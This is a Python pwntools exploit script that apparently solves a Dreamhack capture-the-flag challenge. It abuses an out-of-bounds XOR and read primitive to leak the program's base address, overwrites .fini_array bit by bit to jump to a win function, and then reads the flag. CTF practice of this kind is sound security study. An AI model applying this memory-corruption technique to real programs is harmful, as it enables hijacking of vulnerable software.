#!/usr/bin/env python3
from pwn import *
import time


HOST = "host8.dreamhack.games"
PORT = 23733

ARR = 0x34C0
DSO_HANDLE = 0x3488
FINI_ARRAY = 0x3218
WIN = 0x13ED


def idx(addr):
    return (addr - ARR) // 8


def choose_io():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process("./deploy/main")


def do_xor(io, i, j):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Enter i & j > ", f"{i} {j}".encode())


def read_arr(io, i):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Enter i > ", str(i).encode())
    io.recvuntil(b"Value: ")
    return int(io.recvline().strip(), 16)


def leak_qword(io, target_idx, scratch=0):
    do_xor(io, scratch, target_idx)
    leaked = read_arr(io, scratch) ^ (1 << scratch)
    do_xor(io, scratch, target_idx)
    return leaked


def flip_to(io, target_idx, old, new):
    delta = old ^ new
    for bit in range(64):
        if (delta >> bit) & 1:
            do_xor(io, target_idx, bit)


def main():
    io = choose_io()

    dso = leak_qword(io, idx(DSO_HANDLE))
    pie_base = dso - DSO_HANDLE
    win = pie_base + WIN

    fini = leak_qword(io, idx(FINI_ARRAY))
    log.info("PIE base        = %#x", pie_base)
    log.info(".fini_array[0]  = %#x", fini)
    log.info("win             = %#x", win)

    flip_to(io, idx(FINI_ARRAY), fini, win)

    io.sendlineafter(b"> ", b"3")
    time.sleep(0.3)
    io.sendline(b"cat flag 2>/dev/null || cat deploy/flag")
    io.interactive()


if __name__ == "__main__":
    main()
